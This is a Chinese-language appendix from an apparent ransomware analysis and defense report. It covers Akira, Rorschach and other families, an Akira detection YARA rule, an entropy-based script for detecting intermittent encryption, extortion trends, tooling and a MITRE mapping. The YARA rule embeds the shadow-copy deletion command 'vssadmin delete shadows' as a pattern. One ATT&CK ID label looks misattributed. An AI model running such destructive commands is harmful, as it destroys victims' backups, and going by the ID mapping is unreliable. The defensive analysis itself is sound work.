| **Akira** | AES-256-CTR | RSA-4096 | 硬编码公钥 | 部分加密（文件尾部跳过） | C++编写，1小时内完成全链攻击，2026年3月84个受害者 |
| **BlackSuit** (Royal变种) | AES-256-CBC | RSA-4096 | 硬编码公钥 | 完整加密 | Conti 代码演化，跨平台支持 |
| **Play** | AES-256-CTR | RSA-2048 | C2动态下发 | 间歇加密（每隔N字节） | 利用 ProxyShell/ProxyLogon 初始访问 |
| **Rorschach** | AES-256-CTR | Curve25519 | ECC 本地生成 | 间歇加密（最快记录） | 代码缝合多家族，加密速度 2x LockBit |
| **Weaxor** | AES-256 | RSA | C2下发 | 完整加密 | 2025年国内传播量第一，AI赋能变种 |
| **SnowSoul** | AES-256-CBC | RSA-2048 | 硬编码 | 部分加密 | 已完整逆向分析密钥管理机制 |
| **Hunters International** | AES-256 | RSA-4096 | 硬编码 | 完整加密 | Hive 源码泄露后的继承者 |
| **Medusa (MedusaLocker)** | AES-256 | RSA-2048 | 硬编码 | 完整加密 | 2025-2026高度活跃 |

#### C.2.2 Akira 深度分析

**加密流程：**
```
Akira 加密核心流程：
1. 获取系统信息 → 生成唯一 Victim ID
2. 读取硬编码 RSA-4096 公钥
3. 每个文件：
   a. 生成随机 AES-256 密钥 + CTR nonce
   b. 加密文件内容（跳过尾部，加速处理）
   c. RSA 加密 AES 密钥 → 追加到文件尾部
   d. 追加 .akira 扩展名
4. 删除 VSS → 投放勒索信 akira_readme.txt
5. 建立反向 shell → C2 通过 WireGuard VPN
```

**关键 IOC 与检测：**
```yara
// Akira 勒索软件检测规则（更新版）
rule Ransomware_Akira_2025 {
    meta:
        author = "Ransomware Analysis Team"
        description = "Akira ransomware - active 2024-2026"
        reference = "CISA AA24-109A updated Nov 2025"
        date = "2025-11-13"
        tlp = "WHITE"

    strings:
        $note1 = "akira_readme" ascii wide nocase
        $note2 = ".akira" ascii wide
        $ext = ".akira" ascii
        $vpn1 = "WireGuard" ascii
        $vpn2 = "wg0" ascii
        $vss_cmd = "vssadmin delete shadows" ascii wide nocase
        $wireguard_api = "WireGuard\\WireGuard.exe" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        filesize < 2MB and
        (
            (1 of ($note*) and $ext) or
            ($vpn1 and $vss_cmd and 1 of ($note*))
        )
}
```

> **参考：** [CISA AA24-109A Akira Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a) | [Halcyon Akira Report](https://www.halcyon.ai/ransomware-research-reports/akira-ransomware-attacks-in-under-an-hour) | [CybelAngel Akira 2026](https://cybelangel.com/blog/the-akira-ransomware-playbook-everything-you-need-to-know/)

#### C.2.3 Rorschach — 最快加密速度记录

**技术特征：**
- **间歇加密（Intermittent Encryption）**：不加密整个文件，仅加密文件特定部分（如每隔 1MB 加密 128KB），实现约 **2x LockBit 的加密速度**
- **代码缝合**：从 Chimera、LockBit 等多个家族中精选代码片段组合而成
- **Curve25519 ECC**：使用椭圆曲线代替 RSA，密钥体积更小、速度更快
- **自动检测虚拟机/沙箱**：如检测到分析环境则不执行加密

**间歇加密检测方法：**
```python
def detect_intermittent_encryption(file_path, block_size=1024*1024):
    """检测间歇加密模式"""
    with open(file_path, 'rb') as f:
        data = f.read()

    results = []
    # 检查每隔 block_size 的数据块熵值
    for offset in range(0, len(data) - block_size, block_size):
        block = data[offset:offset+block_size]
        entropy = calculate_entropy(block)
        results.append({
            'offset': offset,
            'entropy': entropy,
            'encrypted': entropy > 7.0  # 高熵 = 加密
        })

    # 间歇加密特征：交替的高低熵块
    encrypted_blocks = sum(1 for r in results if r['encrypted'])
    total_blocks = len(results)

    if 0 < encrypted_blocks < total_blocks:
        pattern = "交替" if is_alternating(results) else "部分"
        print(f"[!] 检测到{pattern}间歇加密: {encrypted_blocks}/{total_blocks} 块被加密")
        return True
    return False
```

> **参考：** [Check Point Research - Rorschach](https://research.checkpoint.com/2023/rorschach-a-new-sophisticated-and-fast-ransomware/) | [Dark Reading](https://www.darkreading.com/vulnerabilities-threats/mysterious-rorschach-ransomware-doubles-known-encryption-speeds)

### C.3 数据勒索（Data-Only Extortion）新趋势

#### C.3.1 从双重勒索到纯数据勒索

**2025-2026 关键趋势变化：**

```
勒索软件演进时间线：
2020: 双重勒索（加密 + 数据窃取威胁）
2023: 三重勒索（+ DDoS 攻击/客户骚扰）
2024: 四重勒索（+ 监管举报威胁）
2025: 纯数据勒索（不加密，仅窃取 + 泄漏威胁）
      ↑ 11 倍增长（HIPAA Journal 报告）
```

**为什么转向数据勒索：**
1. **更快**：不需要等待加密过程（Akira 已证明可在 1 小时内完成全链，但不加密更快）
2. **更隐蔽**：不触发文件完整性监控和备份告警
3. **更低风险**：不触发勒索软件特定的检测规则
4. **收入不降**：2025 年攻击增长 47%，尽管总收入下降（Recorded Future）

**对逆向分析的影响：**
```
传统分析流程（基于加密样本）：
  二进制 → 加密流程逆向 → 弱点利用 → 解密

纯数据勒索分析流程（无加密样本）：
  网络日志 → 数据外传路径分析 → 暗网泄漏站点监控 → 归因
  ├── 需要更多网络取证能力
  ├── 需要暗网情报收集
  └── 加密货币追踪变得更重要
```

#### C.3.2 多重勒索模式对比

| 模式 | 年份 | 技术 | 检测难度 | 代表团伙 |
|------|------|------|----------|----------|
| 单纯加密 | 2016- | AES+RSA 加密文件 | 低 | 早期 WannaCry, Cerber |
| 双重勒索 | 2020- | 加密 + 数据窃取威胁 | 中 | Maze, REvil, Conti |
| 三重勒索 | 2023- | + DDoS/客户/合作伙伴骚扰 | 中高 | BlackCat, LockBit 3.0 |
| 四重勒索 | 2024- | + 监管/执法机构举报威胁 | 高 | Akira, BlackSuit |
| 纯数据勒索 | 2025- | 仅窃取 + 泄漏（不加密） | 很高 | 新兴团伙（分化分支） |

> **参考：** [Huntress Ransomware Trends 2026](https://www.huntress.com/ransomware-guide/ransomware-trends) | [HIPAA Journal 11x Data-Only](https://www.hipaajournal.com/data-shows-elevenfold-increase-data-only-extortion-attacks/) | [Recorded Future 2026](https://www.recordedfuture.com/blog/ransomware-tactics-2026) | [Cybersecurity Dive](https://www.cybersecuritydive.com/news/ransomware-extortion-bec-arctic-wolf/812321/) | [Canadian Cyber Centre](https://www.cyber.gc.ca/en/guidance/ransomware-threat-outlook-2025-2027)

### C.4 工具生态更新

#### C.4.1 解密工具更新

| 工具 | 更新 | 新增家族覆盖 |
|------|------|-------------|
| **Emsisoft Decryptor** | 持续更新至 2026 | STOP/Djvu 新变种、Amnesia 等累计 100+ 家族 |
| **Kaspersky No Ransom** | 2025-2026 持续更新 | 新增多家族解密器 |
| **NoMoreRansom** | Europol 合作项目扩展 | 100+ 免费解密器聚合 |
| **ID Ransomware** | 识别 1200+ 家族 | 新增 AI 辅助识别 |

#### C.4.2 分析工具生态

| 工具 | 用途 | 说明 |
|------|------|------|
| **Kong** | Agentic 逆向 | 自动化混淆二进制分析，NSA 级框架 |
| **Ghidra 11.3-11.4** | 反编译 | JIT P-Code 模拟器、Python3 内置、符号传播增强 |
| **CAPA 7.0** | 能力检测 | 勒索软件行为自动识别（VSS 删除/加密/网络通信） |
| **YARA 4.5** | 规则匹配 | 新增模块支持勒索软件特征检测 |
| **Binary Ninja 5.3** | 反编译 | Jotunheim 跨反编译器互操作 |
| **Malva.RE** | AI 分析 | 在线恶意软件行为分析平台 |

### C.5 中文社区精华参考

| 来源 | 内容 | 链接 |
|------|------|------|
| 360安全卫士 | 2025年勒索软件流行态势报告（2179起案例） | [360](https://www.360.cn/n/12899.html) |
| 安全客 | 执法打击力度加大，2025年勒索软件攻击仍激增47% | [安全客](https://www.anquanke.com/post/id/314260) |
| 安全客 | Weaxor 勒索家族利用AI攻击，国内多家公司受灾 | [安全客](https://www.anquanke.com/post/id/306881) |
| 安全客 | SnowSoul 勒索软件样本分析：加密机制与解密研究 | [安全客](https://www.anquanke.com/post/id/313279) |
| 中国日报 | 360年度勒索报告：AI成未来勒索对抗决胜因素 | [中国日报](http://cn.chinadaily.com.cn/a/202601/16/WS6969eecda310942cc499b920.html) |
| 安全客 | Weaxor 勒索病毒盯上OA办公系统 | [安全客](https://www.anquanke.com/post/id/309501) |
| 奇安信 | 勒索软件防御解决方案 | 奇安信官网 |

### C.6 防御升级路线图（P0-P3）

```
=== 勒索软件逆向工程能力升级路线图 ===

P0 (立即 / 0-30天):
├── 部署 ID Ransomware + NoMoreRansom 快速识别与解密
├── 集成 CAPA 7.0 自动化勒索软件行为识别
├── 更新 YARA 规则集（Akira/BlackSuit/Play/Rorschach/Weaxor）
└── 建立 Akira 1小时攻击链快速响应 SOP

P1 (短期 / 1-3月):
├── 部署间歇加密检测脚本（应对 Rorschach 类变种）
├── 集成 LLM 辅助逆向工作流（Cisco Talos 模式）
├── 建立纯数据勒索检测流程（无加密样本场景）
└── 扩展暗网泄漏站点监控脚本（Telegram + Tor）

P2 (中期 / 3-6月):
├── 评估 ARES 类 Agentic 解密系统
├── 构建家族代码相似性自动比对平台
├── 集成加密货币追踪自动化（BTC + XMR）
└── 建立勒索软件家族演化追踪数据库

P3 (长期 / 6-12月):
├── 部署 Kong/GhidraMCP 自动化逆向管道
├── AI 驱动勒索软件变种自动分析与归因
├── 多重勒索模式全链检测框架
└── 参与行业威胁情报共享（MITRE ATT&CK 映射更新）
```

### C.7 MITRE ATT&CK 扩展映射（2025-2026 更新）

| 战术 | 技术 ID | 技术名称 | 新增场景 |
|------|---------|----------|----------|
| Resource Development | T1583.004 | Web Services | RaaS 基础设施即服务 |
| Resource Development | T1588.002 | Tool (RaaS) | 勒索软件即服务商业模式成熟化 |
| Initial Access | T1190 | Exploit Public-Facing App | VPN/RDP 仍为主要入口，ProxyShell/ProxyLogon |
| Execution | T1204.002 | Malicious File (User Execution) | AI 生成钓鱼邮件提高点击率 |
| Defense Evasion | T1027.012 | LLM-Generated Obfuscation | AI 辅助代码混淆 |
| Credential Access | T1110 | Brute Force | AI 优化密码猜测策略 |
| Exfiltration | T1567 | Exfiltration Over Web Service | rclone/Mega/WireGuard VPN 外传 |
| Impact | T1486 | Data Encrypted for Impact | 间歇加密（Rorschach 模式） |
| Impact | - | Data-Only Extortion | 不加密，纯数据窃取 + 泄漏威胁 |
| Impact | - | Triple/Quadruple Extortion | +DDoS/客户骚扰/监管举报 |

> **参考：** [Unit 42 Incident Response Report 2026](https://www.paloaltonetworks.com/resources/research/unit-42-incident-response-report) | [GuidePoint GRIT 2026 Report](https://www.guidepointsecurity.com/wp-content/uploads/2026/01/GRIT-2026-Ransomware-and-Cyber-Threat-Report.pdf) | [Akamai Ransomware 2025](https://www.akamai.com/site/en/documents/state-of-the-internet/2025/ransomware-trends-2025.pdf)
